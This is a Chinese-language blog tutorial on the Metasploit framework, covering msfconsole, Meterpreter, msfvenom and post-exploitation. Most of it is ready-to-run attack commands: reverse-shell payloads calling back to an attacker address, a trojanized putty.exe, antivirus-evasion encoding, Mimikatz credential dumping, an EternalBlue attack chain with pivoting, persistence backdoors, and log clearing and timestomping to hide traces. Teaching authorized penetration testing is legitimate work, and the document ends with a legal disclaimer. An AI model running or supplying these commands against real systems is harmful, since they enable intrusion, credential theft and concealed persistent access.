---
title: Metasploit从入门到精通
date: 2026-02-20 08:00:00
tags:
  - 工具
  - 渗透测试
description: Metasploit 从入门到精通——msfconsole、Meterpreter 后渗透与 msfvenom。
categories: 渗透测试
---

## 前言

Metasploit 是目前世界上使用最广泛的渗透测试框架，由 Rapid7 维护开发。它集成了漏洞扫描、漏洞利用、载荷生成、后渗透工具等功能，几乎覆盖了渗透测试的完整生命周期。本文将从基础操作讲起，逐步深入到 Meterpreter、msfvenom、后渗透、代理隧道等高级话题，帮助读者构建完整的 Metasploit 知识体系。

## 环境准备

在开始之前，建议使用 Kali Linux（已预装 Metasploit），或者通过以下方式安装：

```bash
# Kali / Debian 系安装
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && ./msfinstall

# 启动 PostgreSQL 数据库（可选但推荐）
systemctl start postgresql
msfdb init
```

启动数据库后，Metasploit 的 `search` 命令将显著加快，并能持久化存储扫描与利用结果。

---

## 第一章：msfconsole 基础操作

### 1.1 启动控制台

```bash
msfconsole            # 普通启动，带横幅
msfconsole -q         # 静默启动，跳过横幅
msfconsole -r file.rc # 自动执行资源脚本
```

进入控制台后，你会看到 `msf6 >` 提示符。以下是贯穿全文都会用到的核心命令：

| 命令       | 作用                                       |
| ---------- | ------------------------------------------ |
| `search`   | 搜索模块，支持关键词和 CVE 编号            |
| `use`      | 加载指定模块                               |
| `show`     | 显示模块的 options / payloads / targets 等 |
| `set`      | 设置模块参数                               |
| `setg`     | 全局设置参数，切换模块后仍然保留           |
| `unset`    | 取消某个参数的值                           |
| `run` / `exploit` | 执行模块                             |
| `back`     | 退出当前模块回到主控制台                   |
| `info`     | 查看模块详细信息                           |
| `sessions` | 列出和管理已建立的会话                     |

### 1.2 search —— 搜索模块

Metasploit 的模块库极其庞大，`search` 是最常用的命令之一。支持关键词、CVE 编号、模块类型过滤：

```bash
search smb                                # 搜索所有与 SMB 相关的模块
search cve:2021-34527                     # 按 CVE 编号搜索
search type:exploit platform:windows smb  # 按类型和平台过滤
search name:永恒之蓝                       # 部分中文关键词也可匹配
```

搜索结果会显示模块名称、披露时间、Rank（可靠性评级）、描述等信息。

### 1.3 use —— 加载模块

找到合适的模块后，用 `use` 加载：

```bash
use exploit/windows/smb/ms17_010_eternalblue
# 或者使用模块序号（search 结果第一列的编号）
use 0
```

加载成功后提示符会变为 `msf6 exploit(windows/smb/ms17_010_eternalblue) >`，表示已进入模块上下文。

### 1.4 show —— 查看模块配置

```bash
show options      # 查看需要配置的参数
show payloads     # 查看该模块兼容的 payload 列表
show targets      # 查看该模块支持的目标操作系统/版本
show advanced     # 查看高级参数（如超时、重试次数等）
show missing      # 快速列出尚未配置的必填参数
```

对于 `show options`，输出会区分 `Required` 和 `Optional`。必填项必须设置才能执行。

### 1.5 set / setg —— 配置参数

```bash
set RHOSTS 192.168.1.10              # 设置单个目标
set RHOSTS 192.168.1.0/24            # 设置网段
set RPORT 445                        # 设置目标端口
set LHOST 192.168.1.5                # 设置本机监听地址
set LPORT 4444                       # 设置本机监听端口
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # 指定 payload
setg LHOST 192.168.1.5               # 全局设置，切换模块后仍然保留
```

### 1.6 run / exploit —— 执行模块

```bash
run           # 运行当前模块
exploit       # 同 run，传统名称
run -j        # 以任务方式后台运行（将监听器放入 job 队列）
run -z        # 运行但不自动与会话交互
```

使用 `jobs` 可以列出后台任务，`jobs -K` 终止所有后台任务。

---

## 第二章：Meterpreter 核心操作

Meterpreter 是 Metasploit 的高级载荷，运行在目标内存中，不落地磁盘，难以被传统杀软查杀。一旦获得 Meterpreter 会话，就进入了一个功能强大的后渗透阶段。

### 2.1 进入与操作会话

```bash
sessions                    # 列出所有会话
sessions -i 1               # 进入 ID 为 1 的会话
sessions -u 1               # 将普通 shell 会话升级为 Meterpreter
background                  # 将当前 Meterpreter 会话放入后台（或按 Ctrl+Z）
```

进入 Meterpreter 会话后的常见命令：

```
meterpreter > sysinfo       # 目标系统信息
meterpreter > getuid        # 查看当前用户权限
meterpreter > ps            # 进程列表
meterpreter > pwd           # 当前工作目录
meterpreter > ls            # 列出文件
meterpreter > shell         # 进入系统 shell
meterpreter > upload /src /dst   # 上传文件
meterpreter > download /dst /src # 下载文件
meterpreter > screenshot    # 截屏
meterpreter > keyscan_start # 开始键盘记录
meterpreter > keyscan_dump  # 导出按键记录
meterpreter > webcam_list   # 列出摄像头
meterpreter > webcam_snap   # 拍照
```

### 2.2 getsystem —— 权限提升

`getsystem` 尝试将当前用户权限提升为 SYSTEM（仅限 Windows）。它使用命名管道模拟或令牌窃取技术：

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

如果默认技术失败，可以指定技术：

```
meterpreter > getsystem -t 0   # 尝试所有技术
meterpreter > getsystem -t 1   # Named Pipe Impersonation (In Memory/Admin)
meterpreter > getsystem -t 2   # Named Pipe Impersonation (Dropper/Admin)
meterpreter > getsystem -t 3   # Token Duplication (In Memory/Admin)
```

### 2.3 migrate —— 进程迁移

进程迁移是将 Meterpreter 从一个短命进程迁移到稳定进程的核心技术。如果不迁移，当初始进程（如浏览器）被关闭时，会话也会断开。

```
meterpreter > ps                           # 先列出进程
meterpreter > migrate 1840                 # 迁移到 PID 1840（如 svchost.exe）
meterpreter > migrate -N lsass.exe         # 按名称迁移
meterpreter > migrate -N explorer.exe      # 迁移到资源管理器进程
meterpreter > run post/windows/manage/migrate  # 使用后渗透模块自动迁移
```

迁移建议目标：`explorer.exe`、`svchost.exe`、`spoolsv.exe` 等长期运行的进程。避免迁移到安全软件进程。

### 2.4 hashdump —— 导出密码哈希

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

输出格式为 `用户名:RID:LM Hash:NTLM Hash`。获取哈希后可通过在线彩虹表网站或 Hashcat 离线破解。

### 2.5 load kiwi —— 加载 Mimikatz

Kiwi 是 Mimikatz 的 Meterpreter 扩展，用于从内存中提取明文密码、哈希、Kerberos 票据等：

```
meterpreter > load kiwi          # 加载 kiwi 扩展
Loading extension kiwi...Success.

meterpreter > help kiwi          # 查看 kiwi 命令列表

meterpreter > creds_all          # 导出所有凭证（推荐）
meterpreter > creds_msv          # 导出 MSV 凭证（LM/NTLM）
meterpreter > creds_wdigest      # 导出 WDigest 凭证（明文密码，老系统）
meterpreter > creds_kerberos     # 导出 Kerberos 票据
meterpreter > kiwi_cmd "sekurlsa::logonpasswords"  # 执行 Mimikatz 命令
meterpreter > lsa_dump_sam       # 转储 SAM 数据库
meterpreter > lsa_dump_secrets   # 转储 LSA 机密
meterpreter > golden_ticket_create -d lab.local -u Administrator -k krbtgt_hash  # 生成金票
```

注意：在 Windows 10 / Server 2016 及以上版本中，微软默认禁用 WDigest 缓存明文密码。可以通过注册表重新启用：

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

---

## 第三章：msfvenom 载荷生成

msfvenom 是 msfpayload 和 msfencode 的继任者，用于生成各种格式的载荷（payload）。它是红队人员绕过杀软、制作钓鱼附件的基础技能。

### 3.1 基本语法

```bash
# 列出所有 payload
msfvenom -l payloads

# 列出指定平台的 payload
msfvenom -l payloads --platform windows --arch x64

# 查看某个 payload 的必需参数
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

### 3.2 生成各种格式的载荷

**Windows 可执行文件：**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe-service -o service.exe   # 服务格式
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f dll -o evil.dll             # DLL 格式
```

**Linux ELF 可执行文件：**

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf
```

**macOS Mach-O：**

```bash
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f macho -o shell.macho
```

**Android APK（需要签名）：**

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o shell.apk
```

### 3.3 Web 载荷与脚本格式

```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.jsp

# Python
msfvenom -p python/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.py

# Powershell（Base64 编码，适合钓鱼）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o shell.ps1
```

### 3.4 编码与免杀

msfvenom 内置编码器，虽然现代杀软大多能检测，但在某些场景仍然有效：

```bash
# 查看可用编码器
msfvenom -l encoders

# 使用 x86/shikata_ga_nai 编码，迭代 5 次
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 多编码链
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -e x86/call4_dword_xor -i 3 \
  -f exe -o encoded.exe
```

### 3.5 嵌入现有文件

有时需要将载荷嵌入合法文件中以规避检查：

```bash
# 将 Payload 嵌入到合法的 putty.exe 中（模板注入）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 \
  -x putty.exe -k \
  -f exe -o putty_backdoor.exe
```

`-x` 指定模板文件，`-k` 保留模板原始功能（不会破坏原程序）。

### 3.6 多合一 Payload 生成器脚本

以下是一个实用脚本示例，一键生成多平台载荷：

```bash
#!/bin/bash
# generate_all.sh —— 一键生成多格式 payload
LHOST="192.168.1.5"
LPORT=4444
OUTDIR="payloads_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

echo "[*] 正在生成 Windows x64 载荷..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTDIR/win64.exe"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o "$OUTDIR/win64.dll"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh-reflection -o "$OUTDIR/win64.ps1"

echo "[*] 正在生成 Linux x64 载荷..."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o "$OUTDIR/linux64.elf"

echo "[*] 正在生成 Web 载荷..."
msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTDIR/shell.php"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o "$OUTDIR/shell.aspx"

echo "[+] 所有文件已生成在: $OUTDIR"
ls -la "$OUTDIR"
```

在 Metasploit 控制台中用 `use exploit/multi/handler` 配合合适的 payload 来监听：

```bash
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.5
msf6 > set LPORT 4444
msf6 > set ExitOnSession false   # 接受多个连接时不退出
msf6 > run -j                    # 后台运行
```

---

## 第四章：Resource 资源脚本

Resource 脚本可以将一系列 Metasploit 命令写入文件并批量执行，非常适合自动化、重复性任务和多目标渗透。

### 4.1 基础资源脚本

创建 `reverse_listener.rc`：

```
# 自动配置反向 TCP 监听器
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
run -j
```

执行脚本：

```bash
msfconsole -r reverse_listener.rc
# 或者在 msfconsole 内：
msf6 > resource /path/to/reverse_listener.rc
```

### 4.2 批量扫描与利用脚本

创建 `auto_scan.rc`，对网段批量扫描 SMB 漏洞并尝试利用：

```
<ruby>
# 内嵌 Ruby 代码，遍历 IP
(1..254).each do |i|
  ip = "192.168.1.#{i}"
  print_status("[*] Scanning #{ip}...")
  run_single("use auxiliary/scanner/smb/smb_ms17_010")
  run_single("set RHOSTS #{ip}")
  run_single("set THREADS 5")
  run_single("run")
  sleep(1)
end
</ruby>
```

### 4.3 后渗透自动收集脚本

创建 `post_harvest.rc`，进入会话后自动收集信息：

```
# 前提：已有一个 Meterpreter 会话
sessions -i 1
getsystem
migrate -N explorer.exe
hashdump
load kiwi
creds_all
run post/windows/gather/enum_domain
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/multi/recon/local_exploit_suggester
background
```

### 4.4 注册为全局后渗透钩子

```bash
msf6 > setg AutoRunScript multi_console_command -rc /path/to/post_harvest.rc
```

设置后，每个新建立的 Meterpreter 会话都会自动执行该脚本。

---

## 第五章：后渗透模块（Post Exploitation）

Metasploit 提供了数百个后渗透模块，位于 `post/` 路径下，覆盖信息收集、权限维持、横向移动、痕迹清除等。

### 5.1 信息收集

```bash
# 系统信息枚举
meterpreter > run post/windows/gather/enum_applications     # 已安装软件
meterpreter > run post/windows/gather/enum_av_excluded      # 杀软排除路径
meterpreter > run post/windows/gather/enum_patches           # 已安装补丁
meterpreter > run post/windows/gather/enum_domain            # 域信息
meterpreter > run post/windows/gather/enum_shares            # 共享资源
meterpreter > run post/windows/gather/enum_logged_on_users   # 当前登录用户
meterpreter > run post/windows/gather/credentials/*          # 各类凭证收集

# 网络信息
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24  # ARP 扫描
meterpreter > run post/multi/gather/ping_sweep RHOSTS=10.0.0.0/24         # Ping 扫描

# 本地提权建议
meterpreter > run post/multi/recon/local_exploit_suggester
```

`local_exploit_suggester` 会检测目标系统的补丁状况，并推荐可能成功的本地提权模块。

### 5.2 凭证收集

```bash
meterpreter > run post/windows/gather/smart_hashdump         # 全面哈希收集（自动提权）
meterpreter > run post/windows/gather/credentials/credential_collector  # 综合凭证收集器
meterpreter > run post/windows/gather/credentials/mimikatz   # Mimikatz 集成模块
```

### 5.3 信息打包归档

```bash
# loot 命令：存储从目标获取的有价值数据
meterpreter > run post/windows/gather/enum_domain
meterpreter > loot -t domain.info -u Administrator  # 查看收集的数据
```

`loot` 是 Metasploit 的内置机制，将收集到的数据存储到 `~/.msf4/loot/` 目录。

---

## 第六章：autoroute 与 SOCKS 代理

渗透测试中，攻陷一台边界主机后，通常需要以它为跳板进一步探测内网。Metasploit 的 `autoroute` 模块配合 SOCKS 代理可以灵活实现这个需求。

### 6.1 autoroute —— 添加路由

将 Meterpreter 会话作为网关，将流量路由到内网：

```
meterpreter > run autoroute -h              # 查看帮助
meterpreter > run autoroute -s 10.0.0.0/24  # 将 10.0.0.0/24 网段的路由通过当前会话
meterpreter > run autoroute -s 10.0.1.0/24  # 添加更多网段
meterpreter > run autoroute -p              # 查看当前路由表
```

在 msfconsole 中也可以直接操作：

```bash
msf6 > route add 10.0.0.0 255.255.255.0 1   # 通过会话 1 访问 10.0.0.0/24
msf6 > route print                            # 查看路由表
msf6 > route remove 10.0.0.0/24 1             # 删除路由
```

### 6.2 SOCKS4a / SOCKS5 代理

在 autoroute 配置完成后，启动 SOCKS 代理服务，让外部工具（如浏览器、Proxychains、nmap）也能访问内网：

```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5        # SOCKS5
msf6 auxiliary(server/socks_proxy) > set USERNAME msfuser  # 可选认证
msf6 auxiliary(server/socks_proxy) > set PASSWORD msfpass
msf6 auxiliary(server/socks_proxy) > run -j
```

配合 Proxychains 使用，编辑 `/etc/proxychains4.conf`：

```
[ProxyList]
socks5 127.0.0.1 1080
```

然后：

```bash
proxychains4 nmap -sT -Pn 10.0.0.5           # 通过代理扫描内网
proxychains4 crackmapexec smb 10.0.0.0/24    # 通过代理枚举 SMB
proxychains4 xfreerdp /v:10.0.0.10            # 通过代理远程桌面
```

### 6.3 portfwd —— 端口转发

当只需要转发特定端口时，portfwd 更轻量：

```
meterpreter > portfwd add -L 0.0.0.0 -l 3389 -r 10.0.0.10 -p 3389  # 将内网 10.0.0.10:3389 映射到本地
meterpreter > portfwd list                                            # 查看转发列表
meterpreter > portfwd delete -l 3389                                  # 删除转发
```

### 6.4 完整的横向移动示例

假设场景：攻陷了一台 Web 服务器（192.168.1.10），其双网卡可访问内网 10.0.0.0/24：

```bash
# Step 1：建立 Meterpreter 会话
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.5
msf6 > set LPORT 4444
msf6 > run -j

# Step 2：添加内网路由
msf6 > route add 10.0.0.0 255.255.255.0 1

# Step 3：启动 SOCKS 代理
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j

# Step 4：通过 Proxychains 扫描内网
proxychains4 nmap -sT -P0 -p 445 10.0.0.0/24

# Step 5：发现 10.0.0.100 开放 445 端口，通过 Metasploit 利用
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.0.0.100
msf6 > set PAYLOAD windows/x64/meterpreter/bind_tcp   # 内网使用正向连接
msf6 > set LPORT 5555
msf6 > run
```

---

## 第七章：持久化（Persistence）

拿到权限后，需要确保重启或会话断开后仍能重新连接到目标。Metasploit 提供了多种持久化方案。

### 7.1 Meterpreter 持久化脚本

```
meterpreter > run persistence -h

# 开机自启，每 10 秒尝试回连
meterpreter > run persistence -U -i 10 -p 4443 -r 192.168.1.5

# -U: 用户登录时启动
# -X: 系统启动时启动
# -S: 注册为服务
# -i: 回调间隔（秒）
# -p: 回调端口
# -r: 回调 IP
```

此脚本会在目标写入一个 VBS 文件并在注册表中添加启动项。它生成的文件路径可在输出中找到。

### 7.2 计划任务持久化

```
meterpreter > run post/windows/manage/enable_rdp                        # 开启远程桌面
meterpreter > run post/windows/manage/sticky_keys                       # 粘滞键后门
meterpreter > run scheduleme -m 1 -e /tmp/backdoor.exe -H every -S 10  # 每 10 分钟执行
```

### 7.3 WMI 事件订阅持久化

```bash
msf6 > use exploit/windows/local/wmi_persistence
msf6 exploit(windows/local/wmi_persistence) > set SESSION 1
msf6 exploit(windows/local/wmi_persistence) > set CALLBACK_INTERVAL 60000  # 1 分钟
msf6 exploit(windows/local/wmi_persistence) > set EVENT_ID_TRIGGER 4625     # 登录失败时触发
msf6 exploit(windows/local/wmi_persistence) > run
```

WMI 持久化隐蔽性高，触发条件灵活，很难被发现。

### 7.4 注册表 Run 键

```bash
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
  -v "SecurityUpdate" -d "C:\\Windows\\Temp\\backdoor.exe"
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
```

### 7.5 使用 exploit/windows/local/persistence

```bash
msf6 > use exploit/windows/local/persistence
msf6 > set SESSION 1
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.5
msf6 > set LPORT 8443
msf6 > set STARTUP SYSTEM
msf6 > run
```

### 7.6 服务持久化

```
meterpreter > run metsvc -A
```

`metsvc` 会在目标系统安装一个 Meterpreter 服务，监听指定端口。但它容易被杀软标记，使用时需注意。

---

## 第八章：实战完整攻击链

下面演示一个完整的实战攻击流程，从信息收集到持久化控制：

```bash
# ======== Phase 1: 信息收集 ========
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.1.0/24
msf6 > set PORTS 22,80,445,3389,8080
msf6 > set THREADS 20
msf6 > run

# 对发现的目标进行 SMB 漏洞扫描
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS file:/tmp/targets.txt
msf6 > run

# ======== Phase 2: 漏洞利用 ========
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.10
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.5
msf6 > set LPORT 4444
msf6 > run

# ======== Phase 3: 后渗透 ========
meterpreter > getsystem
meterpreter > migrate -N explorer.exe
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > hashdump
meterpreter > run post/windows/gather/enum_domain
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > background

# ======== Phase 4: 内网横向移动 ========
msf6 > route add 10.0.0.0 255.255.255.0 1
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 10.0.0.0/24
msf6 > run

# ======== Phase 5: 持久化 ========
msf6 > sessions -i 1
meterpreter > run persistence -U -X -i 10 -p 8443 -r 192.168.1.5
```

---

## 第九章：常用技巧与注意事项

### 9.1 绕过 Windows Defender

现代环境下默认的 msfvenom 载荷几乎会被 Defender 立即查杀。实用免杀思路：

- 使用 C# / PowerShell 无文件落地技术，载荷放在内存执行
- 使用 `Veil-Evasion`、`Shellter` 等第三方工具配合
- 混淆 shellcode，如使用 XOR/AES 加密后分段加载
- 白加黑：利用合法签名的可执行文件加载恶意 DLL

### 9.2 日志清除

```bash
meterpreter > clearev                                  # 清除 Windows 事件日志
meterpreter > run post/windows/manage/killav           # 尝试关闭杀软进程（高风险）
meterpreter > timestomp C:\\Windows\\Temp\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe  # 修改文件时间戳
```

### 9.3 MSF 数据库操作

```bash
msf6 > db_status                                      # 查看数据库连接状态
msf6 > hosts                                          # 查看已发现的主机
msf6 > services                                       # 查看已发现的服务
msf6 > creds                                          # 查看已收集的凭证
msf6 > vulns                                          # 查看已发现的漏洞
msf6 > db_nmap -sV 192.168.1.10                       # 运行 Nmap 并将结果存入数据库
msf6 > services -S http -c name,port,info             # 在数据库结果中搜索 HTTP 服务
```

### 9.4 使用工作区

工作区用于隔离不同的渗透任务：

```bash
msf6 > workspace -a project_a    # 创建工作区
msf6 > workspace project_a        # 切换工作区
msf6 > workspace -d project_a     # 删除工作区
msf6 > workspace                  # 查看当前工作区
```

### 9.5 会话管理技巧

```bash
msf6 > sessions -n 1 -n new_name      # 给会话命名
msf6 > sessions -u 1                  # 升级普通 shell 为 Meterpreter
msf6 > sessions -K                    # 终止所有会话
msf6 > sessions -t 1 --script-meterpreter -c "hashdump"  # 不进入会话直接执行命令
```

---

## 免责声明

本文所述所有技术、工具和示例仅供安全研究和授权测试使用。任何未经授权的渗透测试、漏洞利用、系统入侵行为均违反《中华人民共和国网络安全法》及《中华人民共和国刑法》。读者应在获得明确书面授权的前提下，在合规环境中使用本文所述工具和技术。

作者不对因滥用本文内容造成的任何直接或间接损失承担法律责任。学习渗透测试的目的是为了更好地防御，而非攻击。请谨记：**能力越大，责任越大**。

---

## 参考资料

- [Metasploit 官方文档](https://docs.metasploit.com/)
- [Metasploit Unleashed (Offensive Security)](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Metasploit Blog](https://www.rapid7.com/blog/tag/metasploit/)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Proxychains 项目](https://github.com/rofl0r/proxychains-ng)
